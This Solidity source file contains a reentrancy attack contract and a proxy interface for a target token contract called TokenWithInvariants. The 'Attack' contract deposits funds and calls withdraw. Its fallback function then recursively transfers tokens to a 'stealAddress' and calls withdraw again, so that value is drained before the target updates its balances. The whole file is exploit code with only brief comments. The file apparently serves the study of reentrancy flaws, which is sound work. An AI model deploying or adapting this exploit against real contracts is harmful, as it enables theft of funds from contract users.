/* The proxy contract is required to declare an interface
   that Attack understands */
contract TWIProxy {
  event Log(string msg ,address from, address to, uint value);
  mapping(address => uint) public balanceOf;
  uint public totalSupply;

  function transfer(address to, uint value) {
  }

  function deposit(uint amount) {
  }

  function withdraw() {
  }

}


contract Attack {
  event AttackLog(string msg, uint value);
  bool performAttack = false;
  uint8 depth = 0;
  uint constant conversion = 1 szabo;
  uint recursions = 1;
  /* fill in with address of TokenWithInvariants contract */
  TWIProxy twi;
  address stealAddress;
  uint8 numTokens;

  /* Constructor */
  function Attack(address _contractAddress, address _stealAddress, uint8 _numTokens, uint _recursions) {
    twi = TWIProxy(_contractAddress);
    stealAddress = _stealAddress;
    numTokens    = _numTokens;
    recursions   = _recursions;
  }

  /* Total supply stays constant wth transfer

     withdraw decreases total supply
     deposit.value increases it

  */


  /* Default function. Always run */
  function() {
    if (performAttack) {
      AttackLog("Increasing depth", depth + 1);
      depth = depth + 1;
      AttackLog("Transfer tokens to other address", numTokens);
      AttackLog("Current szabos", (uint8)(this.balance/conversion));
      AttackLog("Current tokens", twi.balanceOf(this));
      if (depth < recursions) {  /* attack again */
        AttackLog("Recursively attacking", 99);
        /* Transfer tokens to another address */
        twi.transfer.value(numTokens*conversion)(stealAddress,numTokens);
        AttackLog("stealy balance after", twi.balanceOf(stealAddress));
        twi.withdraw();
      } else {
        AttackLog("Attack over", 99);
        performAttack = false; /* turn off attack again*/
      }
    }
  }

  function reset() {
    performAttack = false;
  }

  function attack() {
    depth = 0;
    performAttack = true;
    /* Contract itself must have some funds */
    twi.deposit.value(numTokens*conversion)(numTokens);
    twi.withdraw();
  }

}